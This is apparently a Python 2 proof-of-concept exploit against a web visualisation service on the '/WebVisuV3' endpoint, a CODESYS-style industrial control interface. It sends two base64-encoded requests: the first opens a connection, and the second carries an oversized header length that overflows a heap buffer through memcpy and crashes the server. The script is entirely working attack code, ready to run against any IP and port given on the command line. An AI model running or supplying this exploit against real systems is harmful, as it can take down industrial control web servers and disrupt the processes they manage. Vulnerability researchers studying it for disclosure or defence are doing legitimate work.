import sys, struct, base64 
from httplib import *

def usage():
  print "usage  : "+sys.argv[0] + " <target_ip> <target_port>"
  print "example: "+sys.argv[0] + " 192.168.1.123 8080"

if len(sys.argv) != 3:
  usage()
  sys.exit()

host = str(sys.argv[1])
port = int(sys.argv[2]) 

if(port == 443):
  conn = HTTPSConnection(host, port)
else:
  conn = HTTPConnection(host, port)
  

# Request 1: Allocate 1-byte communication buffer on the heap
print "Issue WEB_CLIENT_OPENCONNECTION..."
url = "/WebVisuV3"
open_conn = base64.b64encode("\x01\x00\x00\x00" + "|foo|1|true|")
headers = {"Connection":"keep-alive", "3S-Repl-Content":open_conn}
conn.request("POST", url, "", headers)
res = conn.getresponse()
print res.status, res.reason
if res.status != 200:
  sys.exit("WEB_CLIENT_OPENCONNECTION failed")

print res.read()

# Request 2: Attack with a long hdr_len in WEB_CLIENT_RUN_SERVICE
print "Attack with WEB_CLIENT_RUN_SERVICE..."

run_svc = "\x02\x00\x00\x00"
run_svc += struct.pack("<H", 0x5050)

hdr_len = 0x1000
# Large hdr_len, causes:
#   memcpy(pCommBuf, run_svc, hdr_len + 4) -> heap overflow
#
run_svc += struct.pack("<H", hdr_len)
run_svc += struct.pack("<H", 4)
run_svc += struct.pack("<H", 1)
run_svc += struct.pack("<I", 0)
run_svc += struct.pack("<I", 0x7ffffff)
run_svc += struct.pack("<H", 0)
run_svc += struct.pack("<H", 0)
run_svc += "A" * hdr_len 

run_svc  = base64.b64encode(run_svc)
headers = {"Connection":"keep-alive", "3S-Repl-Content":run_svc}
conn.request("POST", url, "", headers)
# Web server should die
res = conn.getresponse()
print res.status, res.reason
print res.read()

